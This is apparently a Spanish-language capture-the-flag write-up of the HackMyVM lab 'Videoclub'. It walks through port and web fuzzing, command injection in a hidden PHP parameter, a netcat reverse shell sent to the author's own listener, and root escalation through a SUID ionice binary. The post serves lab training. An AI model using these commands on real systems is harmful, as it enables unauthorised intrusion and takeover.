---
layout      : post
title       : "Videoclub - HackMyVm"
author      : elc4br4
image       : assets/images/HMV/Videoclub-HackMyVM/Videoclub.webp
category    : [ HackMyVM ]
tags        : [ Linux ]
---

馃幃En esta ocasi贸n resuelvo la m谩quina Videoclub de nuestro compa帽ero ShellDredd Inform谩tica. 
Tendremos una enumeraci贸n un poco larga, explotaremos RCE para lograr la intrusi贸n al sistema y escalaremos privilegios a trav茅s del archivo SUID ionice.馃幃

CANAL ShellDredd --> [https://www.youtube.com/c/ShellDreddInform%C3%A1tica](https://www.youtube.com/c/ShellDreddInform%C3%A1tica)



![](/assets/images/HMV/Videoclub-HackMyVM/cartel-club.gif)

# Reconocimiento de Puertos

```nmap
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3377/tcp open  cogsys-lm
```

Tenemos dos puertos abiertos, el puerto 22(ssh) y el puerto 3377(cogsys-lm) del que no conozco absolutamente nada.

Realizo un escaneo m谩s avanzado para obtener m谩s informaci贸n sobre estos puertos.

```nmap
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 96:9f:0e:b8:03:40:88:96:8b:b1:bf:58:ac:ff:d5:3a (RSA)
|   256 f2:38:ff:38:44:1b:7a:5d:3d:0c:bb:cd:c3:93:55:45 (ECDSA)
|_  256 35:c2:e8:90:61:0d:19:7b:01:f0:b5:2a:d1:c6:27:ad (ED25519)
3377/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MARGARITA VIDEO-CLUB
MAC Address: 08:00:27:1A:13:DA (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> `Servidor Apache 2.4.38 bajo el t铆tulo de MARGARITA VIDEO-CLUB`


# Enumeraci贸n Web

Accedo a la web para ver que hay y por lo que veo es la web de un Videoclub.

![](/assets/images/HMV/Videoclub-HackMyVM/web1.webp)

Echo un vistazo al c贸digo fuente pero no veo nada que pueda servirme.

Asique voy a fuzzear rutas del servidor con la herramienta gobuster.

![](/assets/images/HMV/Videoclub-HackMyVM/gobuster.webp)

Tenemos el archivo robots.txt, accedo a el y encuentro una cadena de caracteres que parece estar codificada.

`EJ5do3xtqTuyVTWyp3DtMzyfoKZtLJ5xVUAypzyyplOiMvO0nTHtqzyxMJ8tL2k1LvOgLKWaLKWcqTRfVUEbMFObnJExMJ4tp2yxMFOiMvOwnJ5yoJRh`

Intento decodificarla sin 茅xito.

Pero si miramos bien el robots, al final del todo encontramos lo siguiente:

![](/assets/images/HMV/Videoclub-HackMyVM/robots.webp)

Es un archivo de texto que podr铆a contener algo de informaci贸n valiosa, asique me lo descargo y veo que hay dentro.

```file
k3v1n
sn4k3
d4t4s3c
g4t3s
st4llm4n
t1m
exif
tool
n0n4m3
sofia
lacashita
c4r4c0n0
sml
a1t0rmenta
frodo
f1ynn
nolose
r1tm4tica
l0w
steg
hide
fresh
neo
aquaman
w0nderw0m4n


### POSTDATA ###

THANKS FOR THE PLATFORM AND THE MACHINES MY DEAR SML
THANKS TO ALL CREATORS FOR THE CONTINUOUS FUN, LEARNING AND PASSION OPENLY SHARED.
GOOD H4CKTING
```

Tenemos una lista de palabras que parecen ser usuarios, pero no tenemos credenciales ni nada parecido, asique continuo enumerando el servidor y viendo las rutas.
 
Miro la ruta videos donde tenemos varios videos que me descargo y analizo sus metadatos con exiftool.

![](/assets/images/HMV/Videoclub-HackMyVM/exiftool.webp)

>`Tenemos una pel铆cula secreta, `secret_film:c0ntr0l` `

Los campos Copyright podr铆an ser rutas del servidor, o algun tipo de archivo, asique probar茅.

Para probarlo lo que hago es a帽adir estas palabras al diccionario que uso para fuzzear, usando el comando que ya hab铆a usado en el fuzzeo anterior, ya que estas palabras podr铆an ser archivos y no directorios, asique a帽ado las extensiones t铆picas (html,txt,php,js...)

![](/assets/images/HMV/Videoclub-HackMyVM/gobuster2.webp)

Tenemos varios directorios y un archivo .php que ser谩 el primero que revisar茅, ya que podr铆amos tener alg煤n LFI, Directory Path Transversal o RCE.

Al acceder a la ruta `http://192.168.0.16:3377/c0ntr0l.php` desde el navegador no hay nada, pero podr铆amos mirar si podemos ejecutar comandos o leer archivos locales, ya que tenemos un archivo .php.

Pero existe un problema, necesitamos averiguar el par谩metro para poder probar estas vulnerabilidades, asique vamos a intentar fuzzear para conseguir el par谩metro que buscamos.

Lanzo gobuster usando el diccionario rockyou.txt.

`wfuzz -c -u 'http://192.168.0.16:3377/c0ntr0l.php?FUZZ=id' -w /usr/share/wordlists/rockyou.txt --hl=0 --hc=0 -t 1000`

Pero tarda demasiado y mi paciencia es nula, asique mientras esperaba se me ocurri贸 meter el diccionario de usuarios que hab铆amos encontrado en el servidor web.

`wfuzz -c -u 'http://192.168.0.16:3377/c0ntr0l.php?FUZZ=id' -w /home/elc4br4/user.txt --hl=0 --hc=0 -t 1000`

![](/assets/images/HMV/Videoclub-HackMyVM/wfuzz.webp)

Y ya tenemos el par谩metro `f1ynn`, asique vamos a ver si es vulnerable a RCE el servidor web.

# Explotaci贸n 

```bash
鉂? curl 'http://192.168.0.16:3377/c0ntr0l.php?f1ynn=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Y es vulnerable a RCE, podemos ejecutar comandos en el servidor.

Puedo intentar listar usuarios del sistema

```bash
鉂? curl 'http://192.168.0.16:3377/c0ntr0l.php?f1ynn=ls+/home'
librarian
secret_film
```

Incluso podr铆a intentar leer la flag user.

```bash
鉂? curl 'http://192.168.0.16:3377/c0ntr0l.php?f1ynn=cat+/home/librarian/user.txt'
              .-"'"-.
             |       |  
           (`-._____.-')
        ..  `-._____.-'  ..
      .', :./'.== ==.`\.: ,`.
     : (  :   ___ ___   :  ) ;	a*******f1a**
     '._.:    |0| |0|    :._.'
        /     `-'_`-'     \
      _.|       / \       |._
    .'.-|      (   )      |-.`.
   //'  |  .-"`"`-'"`"-.  |  `\\ 
  ||    |  `~":-...-:"~`  |    ||
  ||     \.    `---'    ./     ||
  ||       '-._     _.-'       ||
 /  \       _/ `~:~` \_       /  \
||||\)   .-'    / \    `-.   (/||||
\|||    (`.___.')-(`.___.')    |||/
 '"'     `-----'   `-----'     '"'
```

Pero para poder escalar privilegios necesito acceso al sistema, asique ya que puedo ejecutar comandos voy a intentar entablar una reverse shell.

Pongo netcat en escucha en el puerto 8888 (por ejemplo).

Y ejecuto el siguiente comando:

`curl 'http://192.168.0.16:3377/c0ntr0l.php?f1ynn=nc++-e+/bin/bash+192.168.0.11+8888'`

Y ya tengo la conexi贸n inversa, tengo acceso al sistema.

![](/assets/images/HMV/Videoclub-HackMyVM/shell.webp)

Pero para tener una shell interactiva he de realizar el tratamiento de la tty.

```bash
script /dev/null -c bash
Script started, file is /dev/null
```

```bash
www-data@video-club-margarita:/var/www/html$ ^Z
zsh: suspended  nc -lnvp 8888
```

```bash
鉂? stty raw -echo; fg
[1]  + continued  nc -lnvp 8888
 				reset
reset: unknown terminal type unknown
Terminal type? xterm
```

```bash
www-data@video-club-margarita:/var/www/html$ export TERM=xterm
www-data@video-club-margarita:/var/www/html$ export SHELL=bash
```

# Escalada de Privilegios

Una vez actualizada la tty, vamos a escalar privilegios, ya que ya hemos leido la flag user.txt

Si buscamos archivos con permisos SUID veremos un archivo que llama la atenci贸n:

```bash
www-data@video-club-margarita:/home$ find / -perm /4000 -type f 2>/dev/null
/home/librarian/ionice
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
```
Tenemos el archivo ionice con permisos SUID, es el que usar茅 para escalar privilegios.

Como de costumbre me dirijo a la web [https://gtfobins.github.io/gtfobins/ionice/](https://gtfobins.github.io/gtfobins/ionice/)

![](/assets/images/HMV/Videoclub-HackMyVM/gtfobins.webp)

Ejecutamos el comando que nos indica la web:

> `/home/librarian/ionice /bin/sh -p`

Y ya somos root y ya podemos leer la flag root.txt!!!

![](/assets/images/HMV/Videoclub-HackMyVM/root.webp)

_Agradecimientos a Shelldredd por esta m谩quina_

